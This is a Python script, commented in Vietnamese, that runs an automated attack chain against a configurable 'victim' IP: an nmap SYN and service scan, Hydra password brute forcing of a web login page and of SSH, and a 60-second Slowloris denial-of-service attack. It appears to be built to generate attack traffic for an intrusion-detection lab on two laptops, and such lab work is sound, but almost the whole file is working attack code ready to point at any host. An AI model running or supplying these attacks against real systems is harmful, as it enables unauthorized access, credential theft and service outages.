import subprocess
import time
import os

# CẤU HÌNH ĐỊA CHỈ IP CỦA LAPTOP 2 (MÁY NẠN NHÂN)
VICTIM_IP = "192.168.x.x"  # TODO: Đổi thành IP WiFi thực tế của Laptop 2

def run_command(command, description):
    print(f"\n{'='*50}")
    print(f"[ATTACK] Đang bắt đầu: {description}")
    print(f"Lệnh: {command}")
    print(f"{'='*50}")
    try:
        # Chạy lệnh hệ thống
        process = subprocess.Popen(command, shell=True)
        # Đợi lệnh chạy xong
        process.wait()
    except KeyboardInterrupt:
        print("\n[!] Dừng cuộc tấn công.")
        process.terminate()

def attack_pipeline():
    # Bước 1: Port Scan (Quét cổng)
    run_command(f"nmap -sS -A -T4 {VICTIM_IP}", "Quét toàn bộ cổng bằng Nmap (Phát hiện PortScan)")
    time.sleep(5) # Nghỉ 5s để phân tách dữ liệu

    # Bước 2: Brute Force Web (Dò mật khẩu Admin)
    # Yêu cầu Máy 1 phải có file wordlist rockyou.txt tại /usr/share/wordlists/
    if os.path.exists("/usr/share/wordlists/rockyou.txt"):
        run_command(f"hydra -l admin -P /usr/share/wordlists/rockyou.txt {VICTIM_IP} http-get /login.php", "Web Brute Force (Hydra)")
    else:
        print("[!] Không tìm thấy rockyou.txt, bỏ qua Web Brute Force.")
        # Chạy tạm bằng list nhỏ
        run_command(f"hydra -l admin -p password123 {VICTIM_IP} http-get /login.php", "Web Brute Force (Hydra - Mini)")
    
    time.sleep(5)

    # Bước 3: Brute Force SSH (Dò mật khẩu SSH)
    run_command(f"hydra -l admin -p password123 ssh://{VICTIM_IP}", "SSH Brute Force")
    time.sleep(5)

    # Bước 4: Tấn công DoS (Slowloris)
    print("\n[ATTACK] Kích hoạt DoS Slowloris. Sẽ tự động dừng sau 60 giây...")
    try:
        # Chạy slowloris trong 60 giây rồi kill
        subprocess.run(f"timeout 60s slowloris {VICTIM_IP} -p 80 -s 500", shell=True)
    except Exception as e:
        print(f"Lỗi chạy Slowloris: {e}")

if __name__ == "__main__":
    if "192.168.x.x" in VICTIM_IP:
        print("[LỖI] Vui lòng chỉnh sửa biến VICTIM_IP thành IP thật của Laptop 2.")
        exit(1)
        
    print(f"=== BẮT ĐẦU KỊCH BẢN TẤN CÔNG VÀO {VICTIM_IP} ===")
    attack_pipeline()
    print("\n=== HOÀN THÀNH KỊCH BẢN TẤN CÔNG ===")
